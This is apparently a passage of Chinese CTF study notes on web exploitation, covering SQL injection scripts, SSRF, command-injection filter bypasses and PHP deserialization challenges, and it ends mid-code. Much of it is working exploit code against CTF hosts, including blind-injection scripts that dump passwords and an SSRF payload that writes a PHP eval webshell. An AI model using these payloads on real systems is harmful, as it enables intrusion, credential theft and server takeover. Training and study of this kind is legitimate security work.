<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fb159c83-e932-48ed-88af-dbe07ad17a5a.node5.buuoj.cn:81/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(1,100):</span></span><br><span class="line">    <span class="comment">#payload = f&quot;TMP0919&#x27; Order by &#123;i&#125;%23&quot;</span></span><br><span class="line">    <span class="comment">#res = requests.get(url=url + payload)</span></span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="comment">#if(&quot;id&quot; not in res.text):</span></span><br><span class="line">    <span class="comment">#    print(f&quot;i = &#123;i&#125;&quot;)</span></span><br><span class="line">    <span class="comment">#    break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(TaBle_nAme) From infOrmation_schema.tables WHeRe Table_schema=Database())),2,3,4,5%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(column_name) From infOrmation_schema.columns WHeRe Table_name=&#x27;here_is_flag&#x27;)),2,3,4,5%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(flag) From here_is_flag)),2,3,4,5%23&quot;</span></span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>



<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="(2)时间盲注"></a>(2)时间盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze6irbn0iiiic2wnub2.cloudeci1.ichunqiu.com/index.html&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line"> low = <span class="number">32</span></span><br><span class="line"> high = <span class="number">128</span></span><br><span class="line"> mid = (low+high)//<span class="number">2</span></span><br><span class="line"> <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">     time.sleep(<span class="number">0.2</span>)</span><br><span class="line">     payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line"><span class="comment">#把payload里password换成username打username</span></span><br><span class="line">     datas = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment"># print(datas)</span></span><br><span class="line">     start_time=time.time()</span><br><span class="line">     res = requests.post(url=url,data=datas)  <span class="comment">#json=data</span></span><br><span class="line">     end_time=time.time()</span><br><span class="line">     spend_time=end_time-start_time</span><br><span class="line">     <span class="keyword">if</span> spend_time&gt;=<span class="number">0.4</span>: <span class="comment">#这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span></span><br><span class="line">         low = mid+<span class="number">1</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         high = mid</span><br><span class="line">     mid = (low+high)//<span class="number">2</span></span><br><span class="line"> <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"> flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line"> <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>+<span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="(3)布尔盲注"></a>(3)布尔盲注</h3><h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World)"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019">https://buuoj.cn/challenges#[CISCN2019</a> 华北赛区 Day2 Web1]Hack World)</h4><h2 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h2><h3 id="1-存储型"><a href="#1-存储型" class="headerlink" title="(1)存储型"></a>(1)存储型</h3><h3 id="2-反射型"><a href="#2-反射型" class="headerlink" title="(2)反射型"></a>(2)反射型</h3><h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="(3)DOM型"></a>(3)DOM型</h3><h2 id="XXE和SSRF"><a href="#XXE和SSRF" class="headerlink" title="XXE和SSRF"></a>XXE和SSRF</h2><p>主要是提一下原理和模板</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HITCON">https://buuoj.cn/challenges#[HITCON</a> 2017]SSRFme)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://c9f6fe87-ec4b-42d3-9b16-a372427cc0a0.node5.buuoj.cn:81/?url=data:text/plain,%27%3C?php%20@eval($_POST[%27capt%27])?%3E%27&amp;filename=upload/test.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://c9f6fe87-ec4b-42d3-9b16-a372427cc0a0.node5.buuoj.cn:81/sandbox/50d5f583d8a911dde39156ba3f03c3d5/upload/test.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>从简单到难（基础例题示例如下，还会增加难度的）</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>RCE，即<strong>远程代码执行</strong>（Remote Code Execution），远程命令&#x2F;代码执行漏洞，简称为RCE漏洞，可以直接向服务器后台远程注入操作系统的命令或者代码，从而拿到服务器后台的权限。RCE分为远程执行命令（执行ping命令）和远程代码执行eval</p>
<p>(这边插入一个各种绕过.md)</p>
<h5 id="RCE命令注入分类"><a href="#RCE命令注入分类" class="headerlink" title="RCE命令注入分类"></a>RCE命令注入分类</h5><ul>
<li>无过滤</li>
<li>过滤cat</li>
<li>过滤空格</li>
<li>过滤目录分隔符</li>
<li>过滤运算符</li>
<li>综合过滤练习</li>
</ul>
<h3 id="1-无过滤简单命令拼接"><a href="#1-无过滤简单命令拼接" class="headerlink" title="(1)无过滤简单命令拼接"></a>(1)无过滤简单命令拼接</h3><h4 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h4><p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>就是个简单的命令拼接(127.0.0.1;ls)</p>
<p>Shell 提供了多种方式来分隔命令，分号就是其中一种。它的作用是告诉 Shell，将分号前后的命令依次执行，而不考虑前一条命令是否执行成功 。例如，在命令 “<code>ping -c 4 127.0.0.1;ls /</code>” 中，Shell 先执行 “<code>ping -c 4 127.0.0.1</code>” 命令，不管这个命令是成功（返回 0）还是失败（返回非 0 值），都会接着执行 “<code>ls /</code>” 命令</p>
<ul>
<li>Enter(换行符)</li>
<li>&amp;&amp; 前一条命令执行成功（返回值为 0）时，才会执行后一条命令</li>
<li>双管道符（||）前一条命令执行失败（返回值非 0）时，才会执行后一条命令</li>
<li>管道符（|） 将前一条命令的输出作为后一条命令的输入</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | grep <span class="string">&quot;txt&quot;</span>  <span class="comment"># 列出根目录下包含 &quot;txt&quot; 的文件</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>尖括号（ &lt; 和 &gt; ）</p>
<p><strong>特点</strong>：</p>
</li>
<li><p><code>&gt;</code>：将命令输出重定向到文件（覆盖）。</p>
</li>
<li><p><code>&gt;&gt;</code>：将命令输出追加到文件。</p>
</li>
<li><p><code>&lt;</code>：将文件内容作为命令的输入。</p>
</li>
<li><p>E.G：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; output.txt  <span class="comment"># 将 ls 的输出保存到 output.txt</span></span><br><span class="line"><span class="built_in">sort</span> &lt; input.txt   <span class="comment"># 将 input.txt 的内容作为 sort 的输入</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="NCTF2024"><a href="#NCTF2024" class="headerlink" title="NCTF2024"></a>NCTF2024</h4><p>payload:</p>
<p><code>127.0.0.1 --eval eval(&quot;__import__(&#39;os&#39;).system(&#39;echo$IFS$FLAG&gt;&gt;demo&#39;)&quot;)</code></p>
<p><code>--eval</code> 用于在命令行上直接执行一段脚本代码</p>
<p>…..</p>
<p>…..</p>
<h3 id="2-过滤命令"><a href="#2-过滤命令" class="headerlink" title="(2)过滤命令"></a>(2)过滤命令</h3><h4 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p><strong>八进制绕过</strong></p>
<p><em><strong>知识点：linux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码</strong></em></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">&#x27;\154\163&#x27;</span> //执行<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure>

<p>发现可以成功执行</p>
<p>但是八进制的执行方法不能执行带有参数的linux命令，如cat &#x2F;flag(&#x2F;flag为参数)或ls -la(-la为参数)</p>
<p><strong>重定向符号可以代替命令中的空格</strong></p>
<p><strong>最终payload</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">&#x27;\143\141\164&#x27;</span>&lt;$<span class="string">&#x27;\57\146\154\141\147&#x27;</span> // <span class="built_in">cat</span>&lt;/flag</span></span><br></pre></td></tr></table></figure>



<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-红明谷CTF-2021-write-shell-Write-shell"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-红明谷CTF-2021-write-shell-Write-shell" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[红明谷CTF 2021]write_shell) Write_shell"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BA%A2%E6%98%8E%E8%B0%B7CTF">https://buuoj.cn/challenges#[红明谷CTF</a> 2021]write_shell) Write_shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt;</span><br></pre></td></tr></table></figure>

<p>因为题目中过滤了php，所以用php短标签来绕过<code>&lt;?= ?&gt;</code>等效于<code>&lt;?echo ?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>输出访问者的IP地址</p>
<h3 id="3-回溯限制"><a href="#3-回溯限制" class="headerlink" title="(3)回溯限制"></a>(3)回溯限制</h3><h4 id="NISACTF-2022-middlerce-NSSCTF"><a href="#NISACTF-2022-middlerce-NSSCTF" class="headerlink" title="[NISACTF 2022]middlerce | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">NISACTF 2022]middlerce | NSSCTF</a></h4><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit ： <code>1000000</code></p>
<p>当回溯次数超过100万次时，preg_match返回的就是false，表示此次实行失败（超出限制）</p>
<p>所以我们可以通过发送超长字符串来使正则执行失败，绕过对php的限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28058/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;,&quot;+&quot;:&quot;&#x27;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(url=url, data=&#123;<span class="string">&quot;letter&quot;</span>: payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>



<h3 id="（4）无回显RCE（利用http标头）"><a href="#（4）无回显RCE（利用http标头）" class="headerlink" title="（4）无回显RCE（利用http标头）"></a>（4）无回显RCE（利用http标头）</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]R!!C!!E!!) R!!C!!E!!</p>
<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>主要是..&#x2F;..&#x2F;，但包含php和python的目录穿越</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="1-php一般反序列化"><a href="#1-php一般反序列化" class="headerlink" title="(1)php一般反序列化"></a>(1)php一般反序列化</h3><h4 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> <strong>Web_php_unserialize</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-php-Pop链"><a href="#2-php-Pop链" class="headerlink" title="(2)php-Pop链"></a>(2)php-Pop链</h3><h4 id="ISCC2025区域赛-想犯大吴疆土吗"><a href="#ISCC2025区域赛-想犯大吴疆土吗" class="headerlink" title="ISCC2025区域赛 想犯大吴疆土吗"></a>ISCC2025区域赛 想犯大吴疆土吗</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 犯flag.php疆⼟者，盛必击⽽破之！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuDingDao</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$desheng</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;desheng = <span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$yishi</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$dingjv</span> = <span class="variable language_">$this</span>-&gt;desheng;</span><br><span class="line">		<span class="variable">$dingjv</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;下次沙场相⻅, 徐某定不留情&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TieSuoLianHuan</span> </span>&#123;</span><br><span 